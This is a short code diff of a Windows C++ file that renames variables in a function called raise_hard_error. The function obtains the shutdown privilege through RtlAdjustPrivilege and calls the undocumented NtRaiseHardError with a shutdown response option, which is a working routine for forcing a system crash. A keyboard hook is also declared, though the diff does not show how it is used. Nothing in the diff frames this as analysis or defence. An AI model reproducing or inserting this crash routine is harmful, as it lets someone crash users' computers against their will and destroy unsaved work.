@@ -7,14 +7,14 @@
 #include <unordered_set>
 
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
-	NTSTATUS ErrorStatus, ULONG NumberOfParameters,
-	ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters,
-	ULONG ResponseOption, PULONG Response);
+	NTSTATUS err_stat, ULONG num_params,
+	ULONG unicode_mask OPTIONAL, PULONG_PTR params,
+	ULONG response_option, PULONG response);
 
-typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege,
-	BOOLEAN Enable,
-	BOOLEAN CurrentThread,
-	PBOOLEAN Enabled);
+typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG privilege,
+	BOOLEAN enable,
+	BOOLEAN current_thread,
+	PBOOLEAN enabled);
 
 static void raise_hard_error() {
 	BOOLEAN enabled;
@@ -23,10 +23,10 @@ static void raise_hard_error() {
 		GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
 	LPVOID func_addr_2 =
 		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)func_addr_1;
-	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)func_addr_2;
-	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &enabled);
-	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &resp);
+	pdef_RtlAdjustPrivilege nt_call_1 = (pdef_RtlAdjustPrivilege)func_addr_1;
+	pdef_NtRaiseHardError nt_call_2 = (pdef_NtRaiseHardError)func_addr_2;
+	NTSTATUS NtRet = nt_call_1(19, TRUE, FALSE, &enabled);
+	nt_call_2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &resp);
 }
 
 static HHOOK keyboard_hook;
